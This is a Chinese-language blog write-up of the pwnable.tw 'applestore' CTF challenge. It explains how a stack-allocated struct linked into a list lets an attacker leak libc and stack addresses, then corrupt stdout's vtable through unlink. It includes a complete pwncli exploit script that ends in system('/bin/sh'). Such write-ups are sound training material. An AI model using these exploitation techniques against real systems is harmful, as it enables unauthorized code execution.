# pwnable_applestore



### 总结

看上去花里胡哨的，其实就是对栈空间的一个利用。

<!-- more -->

### checksec

![image-20220304203502079](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304203502079.png)

`libc-2.23.so`。

### 漏洞点

漏洞在`checkout`上，可以将栈上的`Apple`添加到链表中，而栈上的空间是可控的：

![image-20220304203629493](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304203629493.png)

### 利用思路

恢复出结构体：

```c
struct Apple {
	char *info;
	int price;
	struct Apple* next;
	struct Apple* pre;
};
```

利用上面的漏洞，思路为：

- 将栈上的`Apple`放入链表
- 控制栈上的`apple->info`，修改为一个`got`表地址，泄露`libc`地址；修改为`libc.sym['__environ']`泄露栈地址
- 利用`delete`的解链，将`_IO_2_1_stdout_`的`vtable`写为栈地址，并利用`printf`调用链，控制执行`gets(stdout)`
- `delete`结束后，然后继续利用`printf`调用链，执行`system("/bin/sh")`

### EXP

```python
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: roderick
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']
if gift.remote:
    libc = ELF("./libc.so.6")


def list_apple():
    sla("> ", "1")

def add(data):
    if isinstance(data, int):
        data = str(data)
    sla("> ", "2")
    sla("Device Number> ", data)
    ru("You've put *")
    m = rl()
    log_ex(f"get msg: {m}")
    return m

def dele(data):
    if isinstance(data, int):
        data = str(data)
    sla("> ", "3")
    sla("Item Number> ", data)
    m = rls("Remove")
    log_ex(f"get msg: {m}")
    return m


def cart(check="y", n=1):
    sla("> ", "4")
    sla("Let me check your cart. ok? (y/n) > ", check)
    m = rs(n)
    log_ex(f"get msg: {m}")
    return m

def checkout(check="y", n=1):
    sla("> ", "5")
    sla("Let me check your cart. ok? (y/n) > ", check)
    m = rs(n)
    log_ex(f"get msg: {m}")
    return m

# [7, 18, 0, 1]
for i in range(18):
    add(2)

for i in range(7):
    add(1)

add(4)

# 满足checkout条件
checkout(n=26)

# 泄露libc地址
*_, m = cart(check=b"yy"+p32(elf.got.atoi)+p32(0)*3, n=28)

atoi_addr = u32_ex(m[4:8])
log_address("atoi_addr", atoi_addr)
libc_base = atoi_addr - libc.sym.atoi
log_libc_base_addr(libc_base)
libc.address = libc_base

# 泄露栈地址
*_, m = cart(check=b"yy"+p32(libc.sym['__environ'])+p32(0)*3, n=28)
stack_addr = u32_ex(m[4:8])
log_address("stack_addr", stack_addr)
buf_addr = stack_addr - 0x124
log_address("buf_addr", buf_addr)


sla("> ", "3")
# 控制执行gets
sla("Item Number> ", b"27"+p32(0)+p32(libc.sym.gets)+p32(libc.sym['_IO_2_1_stdout_'] + 148-0xc) + p32(buf_addr+4-0x1c)+b"aa")

sleep(1)
# 伪造stdout结构体
payload = flat({
    0:"\x20/bin/sh;",
    56:1,
    64:0xffffffff,
    76: 0xffffffff,
    80: 0xffffffff,
    104: 0xffffffff,
    72: libc.sym['__free_hook'] - 0x40,
    148: libc.sym['_IO_2_1_stdout_']+148,
    152: p32(libc.sym['_IO_2_1_stderr_'])+p32(libc.sym['_IO_2_1_stdout_'])\
        +p32(libc.sym['_IO_2_1_stdin_'])+p32(libc.sym.system)*7
}, filler="\x00")

io.sendline(payload)

ia()
```

远程打：

![image-20220304204349952](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20220304204349952.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://www.roderickchan.cn)  
> URL: https://www.roderickchan.cn/zh-cn/2022-03-04-pwnable-applestore/  

